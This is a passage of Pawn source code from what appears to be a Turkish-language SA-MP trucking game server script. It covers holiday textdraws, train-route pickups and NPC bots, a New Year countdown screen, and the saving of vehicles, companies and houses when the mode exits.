TextDrawFont(Textdraw41, 1);
TextDrawLetterSize(Textdraw41, 0.290000, 1.100000);
TextDrawColor(Textdraw41, -1);
TextDrawSetOutline(Textdraw41, 0);
TextDrawSetProportional(Textdraw41, 1);
TextDrawSetShadow(Textdraw41, 0);
TextDrawSetSelectable(Textdraw41, 0);

Textdraw42 = TextDrawCreate(577.000000, 373.000000, ".");
TextDrawBackgroundColor(Textdraw42, 255);
TextDrawFont(Textdraw42, 1);
TextDrawLetterSize(Textdraw42, 0.290000, 1.100000);
TextDrawColor(Textdraw42, -1);
TextDrawSetOutline(Textdraw42, 0);
TextDrawSetProportional(Textdraw42, 1);
TextDrawSetShadow(Textdraw42, 0);
TextDrawSetSelectable(Textdraw42, 0);

Textdraw43 = TextDrawCreate(573.000000, 397.000000, ".");
TextDrawBackgroundColor(Textdraw43, 255);
TextDrawFont(Textdraw43, 1);
TextDrawLetterSize(Textdraw43, 0.290000, 1.100000);
TextDrawColor(Textdraw43, -1);
TextDrawSetOutline(Textdraw43, 0);
TextDrawSetProportional(Textdraw43, 1);
TextDrawSetShadow(Textdraw43, 0);
TextDrawSetSelectable(Textdraw43, 0);

Textdraw44 = TextDrawCreate(562.000000, 381.000000, ".");
TextDrawBackgroundColor(Textdraw44, 255);
TextDrawFont(Textdraw44, 1);
TextDrawLetterSize(Textdraw44, 0.290000, 1.100000);
TextDrawColor(Textdraw44, -1);
TextDrawSetOutline(Textdraw44, 0);
TextDrawSetProportional(Textdraw44, 1);
TextDrawSetShadow(Textdraw44, 0);
TextDrawSetSelectable(Textdraw44, 0);

	// Yýlbaþý TextDrawlarý
	Textdraw45 = TextDrawCreate(566.500000, 370.000000, "2 Mayis");
	TextDrawAlignment(Textdraw45, 2);
	TextDrawBackgroundColor(Textdraw45, 255);
	TextDrawFont(Textdraw45, 1);
	TextDrawLetterSize(Textdraw45, 0.390000, 1.799999);
	TextDrawColor(Textdraw45, -12566273);
	TextDrawSetOutline(Textdraw45, 1);
	TextDrawSetProportional(Textdraw45, 1);
	TextDrawSetSelectable(Textdraw45, 0);

	Textdraw46 = TextDrawCreate(566.500000, 388.000000, "Truck~n~ve~n~Samp");
	TextDrawAlignment(Textdraw46, 2);
	TextDrawBackgroundColor(Textdraw46, 255);
	TextDrawFont(Textdraw46, 1);
	TextDrawLetterSize(Textdraw46, 0.230000, 1.199999);
	TextDrawColor(Textdraw46, -1);
	TextDrawSetOutline(Textdraw46, 1);
	TextDrawSetProportional(Textdraw46, 1);
	TextDrawSetSelectable(Textdraw46, 0);

	Textdraw47 = TextDrawCreate(566.500000, 422.000000, "HERKES VIP");
	TextDrawAlignment(Textdraw47, 2);
	TextDrawBackgroundColor(Textdraw47, 255);
	TextDrawFont(Textdraw47, 1);
	TextDrawLetterSize(Textdraw47, 0.260000, 1.399999);
	TextDrawColor(Textdraw47, -12566273);
	TextDrawSetOutline(Textdraw47, 1);
	TextDrawSetProportional(Textdraw47, 1);
	TextDrawSetSelectable(Textdraw47, 0);
	
	// Kurban Bayramý Textdrawlarý
	
	Textdraw48 = TextDrawCreate(400.000000, 374.000000, "Model 19833 Cow");
	TextDrawBackgroundColor(Textdraw48, 255);
	TextDrawFont(Textdraw48, 5);
	TextDrawLetterSize(Textdraw48, 0.500000, 1.000000);
	TextDrawColor(Textdraw48, -1);
	TextDrawSetOutline(Textdraw48, 0);
	TextDrawSetProportional(Textdraw48, 1);
	TextDrawSetShadow(Textdraw48, 1);
	TextDrawUseBox(Textdraw48, 1);
	TextDrawBoxColor(Textdraw48, -1);
	TextDrawTextSize(Textdraw48, 129.000000, 91.000000);
	TextDrawSetPreviewModel(Textdraw48, 19833);
	TextDrawSetPreviewRot(Textdraw48, 0.000000, 0.000000, 90.000000, 1.500000);
	TextDrawBackgroundColor(Textdraw48, 0x00000000);
	TextDrawSetSelectable(Textdraw48, 0);

	// Tren Sistemi
	CreateDynamicPickup(1239, 1, 1722.6012,-1939.5197,13.5826, 0);//lS-SF
	CreateDynamicPickup(1239, 1, 2281.3557,-1177.9659,25.9580, 0);//LS-LV
	CreateDynamicPickup(1239, 1, 1437.4191,2620.2400,11.3926, 0);//LV-SF
	CreateDynamicPickup(1239, 1, 2853.7805,1292.9812,11.3906, 0);//LV-LS
	CreateDynamicPickup(1239, 1, -1972.3527,117.4383,27.6940, 0);//SF-LS SF-LV Dýþarý

    CreateDynamic3DTextLabel("[TREN SEFERI] /bilet ls-sf",LABEL_RENK,1722.6012,-1939.5197,13.5826,40.0);//LS SF
	CreateDynamic3DTextLabel("[TREN SEFERI] /bilet ls-lv",LABEL_RENK,2281.3557,-1177.9659,25.9580,40.0);//LS LV
	CreateDynamic3DTextLabel("[TREN SEFERI] /bilet lv-sf",LABEL_RENK,1437.4191,2620.2400,11.3926,40.0);//LV SF
	CreateDynamic3DTextLabel("[TREN SEFERI] /bilet lv-ls",LABEL_RENK,2853.7805,1292.9812,11.3906,40.0);//LV LS
	CreateDynamic3DTextLabel("[TREN SEFERI] /bilet sf-ls & /bilet sf-lv",LABEL_RENK,-1972.3527,117.4383,27.6940,40.0);//SFLS SFLV

    NPCLSSF =	Vehicle_AddStatic(538,1705.2245,-1953.9886,13.2089,271.3757,1,1, 600); //
    lssf3dtext = Create3DTextLabel( "LS-SF Seferi Treni", LABEL_RENK, 0.0, 0.0, 0.0, 75.0, 0, 0);
    Attach3DTextLabelToVehicle( lssf3dtext, NPCLSSF, 0.0, 0.0, 2.0);

	NPCLSLV =	Vehicle_AddStatic(538,2285.1902,-1196.0715,24.6320,179.8727,1,1, 600); //
    lslv3dtext = Create3DTextLabel( "LS-LV Seferi Treni", LABEL_RENK, 0.0, 0.0, 0.0, 75.0, 0, 0);
    Attach3DTextLabelToVehicle( lslv3dtext, NPCLSLV, 0.0, 0.0, 2.0);

	NPCLVLS =	Vehicle_AddStatic(538,2864.8279,1246.4818,10.5256,359.7910,1,1, 600); //
    lvls3dtext = Create3DTextLabel( "LV-LS Seferi Treni", LABEL_RENK, 0.0, 0.0, 0.0, 75.0, 0, 0);
    Attach3DTextLabelToVehicle( lvls3dtext, NPCLVLS, 0.0, 0.0, 2.0);

	NPCLVSF =	Vehicle_AddStatic(538,1409.3870,2634.9695,10.4519,89.4379,1,1, 600); //
    lvsf3dtext = Create3DTextLabel( "LV-SF Seferi Treni", LABEL_RENK, 0.0, 0.0, 0.0, 75.0, 0, 0);
    Attach3DTextLabelToVehicle( lvsf3dtext, NPCLVSF, 0.0, 0.0, 2.0);

	NPCSFLV =	Vehicle_AddStatic(538,-1941.7499,186.2002,25.4279,358.2315,1,1, 600); //
    sflv3dtext = Create3DTextLabel( "SF-LV Seferi Treni", LABEL_RENK, 0.0, 0.0, 0.0, 75.0, 0, 0);
    Attach3DTextLabelToVehicle( sflv3dtext, NPCSFLV, 0.0, 0.0, 2.0);

	NPCSFLS =	Vehicle_AddStatic(538,-1944.2300,12.8863,25.3341,176.5400,1,1, 600); //
    sfls3dtext = Create3DTextLabel( "SF-LS Seferi Treni", LABEL_RENK, 0.0, 0.0, 0.0, 75.0, 0, 0);
    Attach3DTextLabelToVehicle( sfls3dtext, NPCSFLS, 0.0, 0.0, 2.0);
/*
	Coach1 =	AddStaticVehicle(437, 2109.1763, 1503.0453, 32.2887, 82.2873, 0, 1);
	Coach2 =	AddStaticVehicle(437, 2109.1763, 1503.0453, 32.2887, 82.2873, 0, 1);
	Barracks =	AddStaticVehicle(433, 2109.1763, 1503.0453, 32.2887, 82.2873, 0, 1);
	LSPDcar =	AddStaticVehicle(596, 2109.1763, 1503.0453, 32.2887, 82.2873, 0, 1);
	Ambulance =	AddStaticVehicle(416, 2109.1763, 1503.0453, 32.2887, 82.2873, 3, 6);
	Ambulanceheli =	AddStaticVehicle(563, 2109.1763, 1503.0453, 32.2887, 82.2873, 3, 6);
	Firetruck =	AddStaticVehicle(407, 2109.1763, 1503.0453, 32.2887, 82.2873, 6, 3);
	Hunter =	AddStaticVehicle(425, 2109.1763, 1503.0453, 32.2887, 82.2873, 0, 0);
    PDbike =	AddStaticVehicle(523, 2109.1763, 1503.0453, 32.2887, 82.2873, 0, 1);
    Train =	AddStaticVehicle(538, 2109.1763, 1503.0453, 32.2887, 82.2873, 0, 1);
    Infernus =	AddStaticVehicle(411, 2109.1763, 1503.0453, 32.2887, 82.2873, 3, 3);
    Sultan =	AddStaticVehicle(560, 2109.1763, 1503.0453, 32.2887, 82.2873, 0, 0);
    AT400 =	AddStaticVehicle(577, 2109.1763, 1503.0453, 32.2887, 82.2873, 1, 3);
*/

    LastVehicleID = NPCSFLS;

	ConnectNPC("LSSF","LSSF");
	ConnectNPC("LSLV","LSLV");
	ConnectNPC("LVLS","LVLS");
	ConnectNPC("LVSF","LVSF");
	ConnectNPC("SFLV","SFLV");
	ConnectNPC("SFLS","SFLS");
/*
	ConnectNPC("Mike","busbot");
	ConnectNPC("Tom","busbot2");
	ConnectNPC("Andrew","barracksbot");
	ConnectNPC("Johnson","copcarbot");
	ConnectNPC("Anderson","ertbot");
	ConnectNPC("Mathew","erthelicopterbot");
	ConnectNPC("Davidson","firetruckbot");
	ConnectNPC("Moralles","hunterbot");
	ConnectNPC("Yards","policebikebot");
	ConnectNPC("Kelroy","trainbot");
	ConnectNPC("Sarah","infbot");
	ConnectNPC("Michael","sultanbot1");
	ConnectNPC("Roy","at400bot");
*/
	//Sedo ev objeler
	/*printf("Sedo Malikane Loaded");

	SedoIcKapi[0] = CreateDynamicObject(19859, 2886.735839, -351.673370, 7.967061, 0.000000, 0.000000, 90.000000); // EvIcKapi+90
	SedoIcKapi[1] = CreateDynamicObject(19859, 2906.320800, -351.673370, 7.967061, 0.000000, 0.000000, 90.000000); // EvIcKapi-90
	SedoGarajKapi[0] = CreateDynamicObject(19906, 2875.022460, -310.246459, 9.937064, 0.000000, 0.000000, 0.000000); // GarajKapiRX-90
	SedoGarajKapi[1] = CreateDynamicObject(19906, 2884.006591, -310.246459, 9.937064, 0.000000, 0.000000, 0.000000); // GarajKapiRX-90
	SedoGarajKapi[2] = CreateDynamicObject(19906, 2893.017822, -310.246459, 9.937064, 0.000000, 0.000000, 0.000000); // GarajKapiRX-90
	SedoGarajKapi[3] = CreateDynamicObject(19906, 2901.998535, -310.246459, 9.937064, 0.000000, 0.000000, 0.000000); // GarajKapiRX-90
	SedoDisKapi[0] = CreateDynamicObject(980, 2865.932373, -350.776275, 9.467059, 0.000000, 0.000000, 90.000000); // DisKapiOZ-10.0
	SedoDisKapi[1] = CreateDynamicObject(980, 2915.898681, -350.776275, 9.467059, 0.000000, 0.000000, 90.000000); // DisKapiOZ-10.0


	CreateDynamicObject(19538, 2886.718505, -350.871948, 6.717057, 0.000000, 0.000000, 90.000000); // -
	CreateDynamicObject(19538, 2917.957763, -350.871948, -24.533937, 90.000000, 0.000000, 90.000000); // -
	CreateDynamicObject(19538, 2886.718505, -413.371887, -55.769954, 0.000000, 90.000000, 90.000000); // -
	CreateDynamicObject(19538, 2886.718505, -288.371917, -55.769954, 0.000000, 90.000000, 90.000000); // -
	CreateDynamicObject(19395, 2886.791748, -350.938598, 8.467062, 0.000000, 0.000000, 0.000000); // -
	CreateDynamicObject(19459, 2886.794189, -363.989257, 8.467061, 0.000000, 0.000000, 0.000000); // -
	CreateDynamicObject(19459, 2886.794189, -337.879486, 8.467061, 0.000000, 0.000000, 0.000000); // -
	CreateDynamicObject(19325, 2886.733642, -355.853546, 8.157060, 0.000000, 0.000000, 0.000000); // -
	CreateDynamicObject(19325, 2886.733642, -346.013580, 8.157060, 0.000000, 0.000000, 0.000000); // -
	CreateDynamicObject(19367, 2888.307617, -332.979034, 8.473362, 0.000000, 0.000000, 90.000000); // -
	CreateDynamicObject(19325, 2896.438232, -332.893676, 8.157060, 0.000000, 0.000000, 90.000000); // -
	CreateDynamicObject(19367, 2891.518310, -332.979034, 8.473362, 0.000000, 0.000000, 90.000000); // -
	CreateDynamicObject(19367, 2901.360107, -332.979034, 8.473362, 0.000000, 0.000000, 90.000000); // -
	CreateDynamicObject(19367, 2904.562255, -332.979034, 8.473362, 0.000000, 0.000000, 90.000000); // -
	CreateDynamicObject(19367, 2888.307617, -368.878814, 8.473362, 0.000000, 0.000000, 90.000000); // -
	CreateDynamicObject(19367, 2891.518310, -368.882965, 8.473362, 0.000000, 0.000000, 90.000000); // -
	CreateDynamicObject(19325, 2896.438232, -368.953613, 8.157060, 0.000000, 0.000000, 90.000000); // -
	CreateDynamicObject(19367, 2901.359619, -368.882965, 8.473362, 0.000000, 0.000000, 90.000000); // -
	CreateDynamicObject(19367, 2904.571533, -368.882965, 8.473362, 0.000000, 0.000000, 90.000000); // -
	CreateDynamicObject(19325, 2906.339599, -362.443481, 8.157060, 0.000000, 0.000000, 0.000000); // -
	CreateDynamicObject(19367, 2906.262451, -367.364929, 8.473362, 0.000000, 0.000000, 180.000000); // -
	CreateDynamicObject(19367, 2906.262451, -357.525146, 8.473362, 0.000000, 0.000000, 180.000000); // -
	CreateDynamicObject(19395, 2906.257324, -350.938598, 8.467062, 0.000000, 0.000000, 0.000000); // -
	CreateDynamicObject(19367, 2906.262451, -354.315185, 8.473362, 0.000000, 0.000000, 180.000000); // -
	CreateDynamicObject(19367, 2906.263427, -354.135101, 8.473362, 0.000000, 0.000000, 180.000000); // -
	CreateDynamicObject(19367, 2906.263427, -347.735229, 8.473362, 0.000000, 0.000000, 180.000000); // -
	CreateDynamicObject(19367, 2906.262451, -334.495056, 8.473362, 0.000000, 0.000000, 180.000000); // -
	CreateDynamicObject(19325, 2906.339599, -339.413360, 8.157060, 0.000000, 0.000000, 0.000000); // -
	CreateDynamicObject(19367, 2906.262451, -344.334869, 8.473362, 0.000000, 0.000000, 180.000000); // -
	CreateDynamicObject(19367, 2906.262451, -347.544708, 8.473362, 0.000000, 0.000000, 180.000000); // -
	CreateDynamicObject(19375, 2891.963378, -337.705993, 6.658056, 0.000000, 90.000000, 0.000000); // -
	CreateDynamicObject(19375, 2891.963378, -347.335754, 6.658056, 0.000000, 90.000000, 0.000000); // -
	CreateDynamicObject(19375, 2891.963378, -356.965545, 6.658056, 0.000000, 90.000000, 0.000000); // -
	CreateDynamicObject(19375, 2891.963378, -364.155639, 6.659055, 0.000000, 90.000000, 0.000000); // -
	CreateDynamicObject(19375, 2901.104003, -337.705993, 6.660054, 0.000000, 90.000000, 0.000000); // -
	CreateDynamicObject(19375, 2901.104003, -347.335937, 6.660054, 0.000000, 90.000000, 0.000000); // -
	CreateDynamicObject(19375, 2901.104003, -356.966033, 6.660054, 0.000000, 90.000000, 0.000000); // -
	CreateDynamicObject(19375, 2901.104003, -364.135925, 6.661054, 0.000000, 90.000000, 0.000000); // -
	CreateDynamicObject(2180, 2905.588623, -364.314422, 6.707048, 0.000000, 0.000000, 90.000000); // -
	CreateDynamicObject(2180, 2904.607910, -365.194152, 6.707048, 0.000000, 0.000000, 360.000000); // -
	CreateDynamicObject(19999, 2904.612792, -363.770782, 6.697054, 0.000000, 0.000000, 130.099975); // -
	CreateDynamicObject(19893, 2905.420898, -363.912872, 7.497056, 0.000000, 0.000000, 270.000000); // -
	CreateDynamicObject(11705, 2905.624511, -364.460876, 7.497055, 0.000000, 0.000000, 270.000000); // -
	CreateDynamicObject(19873, 2905.745605, -363.609741, 7.577054, 0.000000, 0.000000, 0.000000); // -
	CreateDynamicObject(18868, 2905.416992, -363.501129, 7.497054, 0.000000, 0.000000, -79.499969); // -
	CreateDynamicObject(19166, 2904.083007, -368.784545, 8.467061, 810.000000, 900.000000, 720.000000); // -
	CreateDynamicObject(11717, 2905.100097, -368.154602, 6.717051, 0.000000, 0.000000, 180.000000); // -
	CreateDynamicObject(11717, 2903.009521, -368.154602, 6.717051, 0.000000, 0.000000, 180.000000); // -
	CreateDynamicObject(19571, 2904.871582, -365.061767, 7.517055, 90.000000, 16.600006, 0.000000); // -
	CreateDynamicObject(1543, 2904.545410, -365.087860, 7.487053, 0.000000, 0.000000, 0.000000); // -
	CreateDynamicObject(19172, 2886.888671, -364.629852, 8.717065, 0.000000, 0.000000, 90.000000); // -
	CreateDynamicObject(14446, 2888.635986, -364.585754, 7.307054, 0.000000, 0.000000, 90.000000); // -
	CreateDynamicObject(2576, 2890.366943, -368.324737, 6.707053, 0.000000, 0.000000, 180.000000); // -
	CreateDynamicObject(2028, 2903.249023, -333.596466, 7.287053, 0.000000, 0.000000, 0.000000); // -
	CreateDynamicObject(2311, 2902.533691, -333.548980, 6.717048, 0.000000, 0.000000, 0.000000); // -
	CreateDynamicObject(19786, 2903.320312, -333.211853, 8.437055, 0.000000, 0.000000, 180.000000); // -
	CreateDynamicObject(1723, 2905.651611, -334.832153, 6.716457, 0.000000, 0.000000, 270.000000); // -
	CreateDynamicObject(1723, 2900.850097, -336.862091, 6.716457, 0.000000, 0.000000, 450.000000); // -
	CreateDynamicObject(1724, 2902.510742, -338.989807, 6.697052, 0.000000, 0.000000, 154.599929); // -
	CreateDynamicObject(1724, 2904.771484, -338.534240, 6.717052, 0.000000, 0.000000, -153.800109); // -
	CreateDynamicObject(1817, 2903.876708, -336.409484, 6.697052, 0.000000, 0.000000, 90.000000); // -
	CreateDynamicObject(1742, 2906.312988, -343.905700, 6.717051, 0.000000, 0.000000, 270.000000); // -
	CreateDynamicObject(19927, 2887.310058, -335.035827, 6.687050, 0.000000, 0.000000, 0.000000); // -
	CreateDynamicObject(19926, 2887.314208, -336.948150, 6.697052, 0.000000, 0.000000, 0.000000); // -
	CreateDynamicObject(19916, 2887.385009, -333.631866, 6.697052, 0.000000, 0.000000, 450.000000); // -
	CreateDynamicObject(19923, 2890.288330, -333.783355, 6.707052, 0.000000, 0.000000, 360.000000); // -
	CreateDynamicObject(19581, 2890.363281, -334.336730, 7.747056, 0.000000, 0.000000, -151.100051); // -
	CreateDynamicObject(19582, 2890.126953, -333.947875, 7.767056, 0.000000, 0.000000, 0.000000); // -
	CreateDynamicObject(19377, 2891.962402, -337.713012, 10.147068, 0.000000, 90.000000, 0.000000); // -
	CreateDynamicObject(19377, 2891.962402, -347.342803, 10.147068, 0.000000, 90.000000, 0.000000); // -
	CreateDynamicObject(19377, 2891.962402, -356.972625, 10.147068, 0.000000, 90.000000, 0.000000); // -
	CreateDynamicObject(19377, 2891.962402, -364.132843, 10.148068, 0.000000, 90.000000, 0.000000); // -
	CreateDynamicObject(19377, 2901.092773, -337.713012, 10.149066, 0.000000, 90.000000, 0.000000); // -
	CreateDynamicObject(19377, 2901.092773, -347.342895, 10.149066, 0.000000, 90.000000, 0.000000); // -
	CreateDynamicObject(19377, 2901.092773, -356.982604, 10.149066, 0.000000, 90.000000, 0.000000); // -
	CreateDynamicObject(19377, 2901.092773, -364.132568, 10.150068, 0.000000, 90.000000, 0.000000); // -
	CreateDynamicObject(19905, 2888.407470, -302.121002, 6.537048, 0.000000, 0.000000, 0.000000); // -
	CreateDynamicObject(19913, 2890.931884, -289.284332, 7.337057, 0.000000, 0.000000, 0.000000); // -
	CreateDynamicObject(19913, 2915.892333, -387.664459, 7.337057, 0.000000, 0.000000, 90.000000); // -
	CreateDynamicObject(19913, 2915.892333, -314.254211, 7.337057, 0.000000, 0.000000, 90.000000); // -
	CreateDynamicObject(19913, 2890.931884, -412.633850, 7.337057, 0.000000, 0.000000, 0.000000); // -
	CreateDynamicObject(19913, 2865.958740, -387.664459, 7.337057, 0.000000, 0.000000, 90.000000); // -
	CreateDynamicObject(19913, 2865.958740, -314.254302, 7.337057, 0.000000, 0.000000, 90.000000); // -
	CreateDynamicObject(3749, 2865.889404, -350.790802, 12.567062, 0.000000, 0.000000, 90.000000); // -
	CreateDynamicObject(19913, 2865.958740, -384.784393, 7.337057, 0.000000, 0.000000, 90.000000); // -
	CreateDynamicObject(19913, 2865.958740, -316.334930, 7.337057, 0.000000, 0.000000, 90.000000); // -
	CreateDynamicObject(3928, 2903.898681, -398.892639, 6.717052, 0.000000, 0.000000, 90.000000); // -
	CreateDynamicObject(3928, 2879.915283, -398.892639, 6.717052, 0.000000, 0.000000, 90.000000); // -
	CreateDynamicObject(3928, 2891.770019, -398.892639, 6.717052, 0.000000, 0.000000, 90.000000); // -
	CreateDynamicObject(14537, 2896.954589, -379.606262, 8.667057, 0.000000, 0.000000, 0.000000); // -
	CreateDynamicObject(6300, 2921.782470, -349.808319, -6.762930, 0.000000, 0.000000, 90.000000); // -
	CreateDynamicObject(5130, 2923.944824, -350.837249, 3.721755, 0.000000, 0.000000, -45.100002); // -
	CreateDynamicObject(3749, 2915.790527, -350.790802, 12.567062, 0.000000, 0.000000, 90.000000); // -
	CreateDynamicObject(19913, 2915.892333, -384.794067, 7.337057, 0.000000, 0.000000, 90.000000); // -
	CreateDynamicObject(19913, 2915.892333, -316.334320, 7.337057, 0.000000, 0.000000, 90.000000); // -
	CreateDynamicObject(16021, 2944.042724, -350.441436, 1.001757, 0.000000, 0.000000, 180.000000); // -
	CreateDynamicObject(19831, 2904.932861, -369.818115, 6.717054, 0.000000, 0.000000, 0.000000); // -
	CreateDynamicObject(19831, 2903.563232, -369.818115, 6.717054, 0.000000, 0.000000, 0.000000); // -
	CreateDynamicObject(19831, 2902.141845, -369.818115, 6.717054, 0.000000, 0.000000, 0.000000); // -
	CreateDynamicObject(19618, 2890.919189, -368.282318, 7.187055, 0.000000, 0.000000, 180.000000); // -
	CreateDynamicObject(19619, 2891.326416, -368.060424, 7.177057, 0.000000, 0.000000, 172.000000); // -
	CreateDynamicObject(19617, 2906.199951, -366.855865, 8.847056, 0.000000, 0.000000, 270.000000); // -
	CreateDynamicObject(19317, 2887.007324, -368.486145, 7.447787, -16.599992, 0.000000, 149.299896); // -
	CreateDynamicObject(18652, 2886.759033, -337.473358, 9.807046, 0.000000, 0.000000, 0.000000); // -
	CreateDynamicObject(18652, 2886.749023, -350.923248, 9.807046, 0.000000, 0.000000, 0.000000); // -
	CreateDynamicObject(18652, 2886.739013, -364.643096, 9.807046, 0.000000, 0.000000, 0.000000); // -
	CreateDynamicObject(18652, 2906.202636, -350.923461, 9.807046, 0.000000, 0.000000, 0.000000); // -
	CreateDynamicObject(18652, 2906.202636, -367.383209, 9.807046, 0.000000, 0.000000, 0.000000); // -
	CreateDynamicObject(18652, 2906.202636, -334.643554, 9.807046, 0.000000, 0.000000, 0.000000); // -
	CreateDynamicObject(18651, 2894.557373, -379.706542, 10.487070, 0.000000, 0.000000, 0.000000); // -
	CreateDynamicObject(18651, 2899.370605, -379.706542, 10.487070, 0.000000, 0.000000, 0.000000); // -
	CreateDynamicObject(1679, 2886.826416, -383.479736, 7.177051, 0.000000, 0.000000, 0.000000); // -
	CreateDynamicObject(1679, 2886.826416, -376.129882, 7.177051, 0.000000, 0.000000, 0.000000); // -
	CreateDynamicObject(1679, 2886.826416, -379.779907, 7.177051, 0.000000, 0.000000, 0.000000); // -
	CreateDynamicObject(1679, 2906.431884, -379.779907, 7.177051, 0.000000, 0.000000, 0.000000); // -
	CreateDynamicObject(1679, 2906.431884, -375.860076, 7.177051, 0.000000, 0.000000, 0.000000); // -
	CreateDynamicObject(1679, 2906.431884, -383.460174, 7.177051, 0.000000, 0.000000, 0.000000); // -
	*/
	// Yýlbaþý Sayacý
	new year[56], gy;
	getdate(gy);

	Yilbasi8 = TextDrawCreate(170.000000, 145.000000, "_");
	TextDrawBackgroundColor(Yilbasi8, 255);
	TextDrawFont(Yilbasi8, 1);
	TextDrawLetterSize(Yilbasi8, 0.500000, 24.100000);
	TextDrawColor(Yilbasi8, -1);
	TextDrawSetOutline(Yilbasi8, 0);
	TextDrawSetProportional(Yilbasi8, 1);
	TextDrawSetShadow(Yilbasi8, 1);
	TextDrawUseBox(Yilbasi8, 1);
	TextDrawBoxColor(Yilbasi8, 14679848);
	TextDrawTextSize(Yilbasi8, 506.000000, 11.000000);
	TextDrawSetSelectable(Yilbasi8, 0);

	Yilbasi9 = TextDrawCreate(173.000000, 148.000000, "_");
	TextDrawBackgroundColor(Yilbasi9, 255);
	TextDrawFont(Yilbasi9, 1);
	TextDrawLetterSize(Yilbasi9, 0.500000, 23.500001);
	TextDrawColor(Yilbasi9, -1);
	TextDrawSetOutline(Yilbasi9, 0);
	TextDrawSetProportional(Yilbasi9, 1);
	TextDrawSetShadow(Yilbasi9, 1);
	TextDrawUseBox(Yilbasi9, 1);
	TextDrawBoxColor(Yilbasi9, 14679848);
	TextDrawTextSize(Yilbasi9, 503.000000, -3.000000);
	TextDrawSetSelectable(Yilbasi9, 0);

	format(year, sizeof year, "hos geldin %d!", gy);
	Yilbasi10 = TextDrawCreate(342.000000, 131.000000, year);
	TextDrawAlignment(Yilbasi10, 2);
	TextDrawBackgroundColor(Yilbasi10, 255);
	TextDrawFont(Yilbasi10, 2);
	TextDrawLetterSize(Yilbasi10, 0.400000, 2.099999);
	TextDrawColor(Yilbasi10, -40104193);
	TextDrawSetOutline(Yilbasi10, 1);
	TextDrawSetProportional(Yilbasi10, 1);
	TextDrawSetSelectable(Yilbasi10, 0);

	format(year, sizeof year, "elveda %d", gy-1);
	Yilbasi11 = TextDrawCreate(268.000000, 127.000000, year);
	TextDrawBackgroundColor(Yilbasi11, 255);
	TextDrawFont(Yilbasi11, 2);
	TextDrawLetterSize(Yilbasi11, 0.180000, 0.899999);
	TextDrawColor(Yilbasi11, -1414813185);
	TextDrawSetOutline(Yilbasi11, 1);
	TextDrawSetProportional(Yilbasi11, 1);
	TextDrawSetSelectable(Yilbasi11, 0);

	Yilbasi12 = TextDrawCreate(177.000000, 154.000000, YBSERVER_NAME);
	TextDrawBackgroundColor(Yilbasi12, 255);
	TextDrawFont(Yilbasi12, 0);
	TextDrawLetterSize(Yilbasi12, 0.499999, 1.999999);
	TextDrawColor(Yilbasi12, 16711935);
	TextDrawSetOutline(Yilbasi12, 1);
	TextDrawSetProportional(Yilbasi12, 1);
	TextDrawSetSelectable(Yilbasi12, 0);

	Yilbasi13 = TextDrawCreate(177.000000, 176.000000, "Acisiyla, tatlisiyla, iyisiyle kotusuyle bir yil daha gecti.~n~Hos geldin yeni yil. Mutlu yillar dostum!");
	TextDrawBackgroundColor(Yilbasi13, 255);
	TextDrawFont(Yilbasi13, 2);
	TextDrawLetterSize(Yilbasi13, 0.219999, 1.599999);
	TextDrawColor(Yilbasi13, -1);
	TextDrawSetOutline(Yilbasi13, 1);
	TextDrawSetProportional(Yilbasi13, 1);
	TextDrawSetSelectable(Yilbasi13, 0);

	Yilbasi14 = TextDrawCreate(262.000000, 201.000000, "yilbasi_agac");
	TextDrawBackgroundColor(Yilbasi14, 0);
	TextDrawFont(Yilbasi14, 5);
	TextDrawLetterSize(Yilbasi14, 0.219999, 1.599999);
	TextDrawColor(Yilbasi14, -1);
	TextDrawSetOutline(Yilbasi14, 1);
	TextDrawSetProportional(Yilbasi14, 1);
	TextDrawUseBox(Yilbasi14, 1);
	TextDrawBoxColor(Yilbasi14, 255);
	TextDrawTextSize(Yilbasi14, 141.000000, 151.000000);
	TextDrawSetPreviewModel(Yilbasi14, 19076);
	TextDrawSetPreviewRot(Yilbasi14, 0.000000, 0.000000, 0.000000, 1.000000);
	TextDrawSetSelectable(Yilbasi14, 0);

	format(year, sizeof year, "---- ~r~~h~%d skor", YBSCORE_PRIZE);
	Yilbasi15 = TextDrawCreate(345.000000, 224.000000, year);
	TextDrawBackgroundColor(Yilbasi15, 255);
	TextDrawFont(Yilbasi15, 2);
	TextDrawLetterSize(Yilbasi15, 0.219999, 1.599999);
	TextDrawColor(Yilbasi15, -1);
	TextDrawSetOutline(Yilbasi15, 1);
	TextDrawSetProportional(Yilbasi15, 1);
	TextDrawSetSelectable(Yilbasi15, 0);

	format(year, sizeof year, "~r~~h~%d$ ~w~~h~----", YBMONEY_PRIZE);
	Yilbasi16 = TextDrawCreate(267.000000, 249.000000, year);
	TextDrawBackgroundColor(Yilbasi16, 255);
	TextDrawFont(Yilbasi16, 2);
	TextDrawLetterSize(Yilbasi16, 0.219999, 1.599999);
	TextDrawColor(Yilbasi16, -1);
	TextDrawSetOutline(Yilbasi16, 1);
	TextDrawSetProportional(Yilbasi16, 1);
	TextDrawSetSelectable(Yilbasi16, 0);

	Yilbasi19 = TextDrawCreate(418.000000, 346.000000, "hediye kazandin!");
	TextDrawBackgroundColor(Yilbasi19, 255);
	TextDrawFont(Yilbasi19, 2);
	TextDrawLetterSize(Yilbasi19, 0.219999, 1.599999);
	TextDrawColor(Yilbasi19, -1);
	TextDrawSetOutline(Yilbasi19, 1);
	TextDrawSetProportional(Yilbasi19, 1);
	TextDrawSetSelectable(Yilbasi19, 0);

	YilbasiTimer = SetTimer("YilbasiSayaci", 1000, true);

	// Polis Siren Sistemi
	for(new i; i < MAX_VEHICLES; i++)
	{
		Flashing[i] = false;
		MotorMOD[i] = 0;
	}

	printf("Mod tam olarak yuklendi");

	LOG("Sunucu calistirildi.");
	return 1;
}
public OnGameModeExit()
{
	// < Selfie Sistemi > ======================================================
	for(new i =0; i<MAX_PLAYERS;i++) takingselfie[i] = 0;
            
	// Sinyal sistemi
	for(new i=0;i<MAX_VEHICLES;i++) DisableCarBlinking(i);
	
    // Araç Sahiplik Sistemi
	Arac_Kaydet();
	printf("Araclar kaydedildi.");
 	Seifader_OnExit();
    // Kar Sistemi
	ploop(i)
	{
	    if(snowOn{i})
	    {
	        for(new j = 0; j < MAX_SNOW_OBJECTS; j++) DestroyDynamicObject(snowObject[i][j]);
			KillTimer(updateTimer{i});
		}
	}

	// Þirket Sistemi
	SaveSirkets();
	SaveSirketArabas();

	DestroyAllDynamicObjects();
	DestroyAllDynamicMapIcons();

	//
	SaveAllHouses();
	//SaveAllBusiness();
	
	// Ev Sistemi
	foreach(new i : Houses) if(HouseData[i][Save]) SaveHouse(i);
